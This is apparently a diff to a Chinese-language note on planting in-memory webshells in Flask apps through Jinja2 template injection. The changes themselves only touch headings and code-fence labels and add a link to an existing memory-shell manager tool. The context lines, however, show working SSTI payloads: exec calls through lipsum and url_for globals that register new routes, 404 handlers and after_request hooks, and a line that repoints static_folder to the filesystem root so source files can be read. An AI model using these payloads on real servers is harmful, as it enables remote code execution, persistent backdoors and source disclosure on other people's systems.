@@ -37,7 +37,7 @@ request_ctx.request.args.get  				#request_ctx的属性
             )
 ```
 
-#### 装饰器
+#### 路由装饰器
 
 ```python
 {{lipsum.__globals__['__builtins__']['exec']('app._got_first_request=False
@@ -74,7 +74,7 @@ url_for.__globals__['__builtins__']['exec'](
 )
 ```
 
-endpoint装饰器会`view_functions[endpoint] = view_func`，但是有@setupmethod
+#### endpoint装饰器会`view_functions[endpoint] = view_func`，但是有@setupmethod
 
 ```py
 url_for.__globals__['__builtins__']['exec']("app._got_first_request=False
@@ -140,7 +140,7 @@ app.after_request_funcs.setdefault(None, []).append(lambda x:__import__('flask')
 
 ## app.error_handler_spec相关
 
-```
+```py
 lipsum.__globals__['__builtins__']['exec']("app._got_first_request=False
 @app.errorhandler(404)
 def error_handler(d):
@@ -192,3 +192,5 @@ app.static_url_path="/static";app.static_folder="/"   #然后static/app.py读源
 ```
 
 先写这么多，后面再更？
+
+现成的Python内存马管理工具：https://github.com/orzchen/PyMemShell
